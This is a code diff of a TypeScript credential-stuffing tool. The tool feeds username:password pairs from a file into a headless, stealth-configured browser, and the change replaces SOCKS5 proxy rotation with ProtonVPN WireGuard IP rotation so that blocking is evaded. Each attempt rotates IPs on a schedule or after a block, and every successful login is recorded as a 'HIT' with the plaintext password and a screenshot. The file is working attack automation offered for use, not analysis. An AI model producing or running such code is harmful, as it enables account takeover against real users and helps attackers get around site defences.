@@ -1,13 +1,13 @@
 // login-auto.ts — Credential stuffing automation
 // Reads creds.txt (user:pass per line), reuses scanner selectors,
-// attempts login per cred with Hysteria2 proxy rotation.
+// attempts login per cred with ProtonVPN WireGuard IP rotation.
 
 import { chromium, Page } from 'playwright';
 import * as fs from 'fs';
 import * as path from 'path';
 import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
 import { scanLogin, ScanResult } from './scanner';
-import { initProxies, nextProxy, recordSuccess as proxySuccess, recordFail as proxyFail, printProxyStats, ProxySlot } from './proxy-rotator';
+import { initProxies, rotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';
 
 
 // ─── Types ────────────────────────────────────────────────────────────────────
@@ -186,8 +186,21 @@ export async function runLoginAuto(
     console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
   }
 
-  // ── Hysteria2 proxy rotation ─────────────────────────────────────────────
-  const proxies = initProxies();
+  // ── ProtonVPN WireGuard rotation ─────────────────────────────────────────
+  const configDir = process.env.PROTON_CONFIG_DIR || './proton_configs';
+  const vpnSlots = initProxies(configDir);
+  if (vpnSlots.length === 0) {
+    console.error('[auto] No VPN configs found. Add ProtonVPN WireGuard .conf files to ./proton_configs/');
+    console.error('[auto] Or set PROTON_CONFIG_DIR=/path/to/configs');
+    return;
+  }
+
+  // Activate the first VPN before starting
+  let activeVpn = rotate();
+  if (!activeVpn) {
+    console.error('[auto] Failed to activate initial VPN. Cannot proceed.');
+    return;
+  }
 
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
@@ -198,11 +211,17 @@ export async function runLoginAuto(
   for (let i = 0; i < creds.length; i++) {
     const { username, password } = creds[i];
 
-    // Rotate to next Hysteria2 SOCKS5 proxy for this attempt
-    const proxySlot = nextProxy();
-    const proxyUrl  = proxySlot.url;
+    // Rotate VPN every N attempts
+    if (i > 0 && i % rotateEvery === 0) {
+      console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempts)...`);
+      activeVpn = rotate();
+      if (!activeVpn) {
+        console.warn('[auto] VPN rotation failed — continuing with current connection.');
+      }
+    }
 
-    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | proxy: ${proxySlot.name} (port ${proxySlot.port})`);
+    const vpnName = activeVpn?.name ?? 'none';
+    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | vpn: ${vpnName}`);
 
     const browser = await chromium.launch({
       headless: true,
@@ -210,8 +229,9 @@ export async function runLoginAuto(
       ignoreHTTPSErrors: true as any,
     } as any);
 
+    // No proxy needed — traffic routes through the WireGuard VPN interface directly
     const context = await browser.newContext({
-      ...getStealthContextOptions(proxyUrl),
+      ...getStealthContextOptions(),
       ignoreHTTPSErrors: true as any,
     } as any);
 
@@ -225,7 +245,7 @@ export async function runLoginAuto(
       timestamp:  new Date().toISOString(),
       success:    false,
       reason:     '',
-      tunnel:     proxySlot.name,
+      tunnel:     vpnName,
       durationMs: 0,
     };
 
@@ -237,7 +257,7 @@ export async function runLoginAuto(
 
       if (outcome.success) {
         console.log(`[auto] ✓ HIT: ${username}:${password} (${outcome.reason})`);
-        proxySuccess(proxySlot);
+        if (activeVpn) vpnSuccess(activeVpn);
         succeeded++;
         hits.push(attempt);
         await page.screenshot({ path: `./hit_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true });
@@ -250,9 +270,10 @@ export async function runLoginAuto(
       attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
       attempt.durationMs = Date.now() - t0;
 
-      proxyFail(proxySlot);
+      if (activeVpn) vpnFail(activeVpn);
       if (isBlockError(err.message ?? '')) {
-        console.warn(`[auto] Block/connection error on ${proxySlot.name} — will rotate to next proxy.`);
+        console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
+        activeVpn = rotate();
       }
     }
 
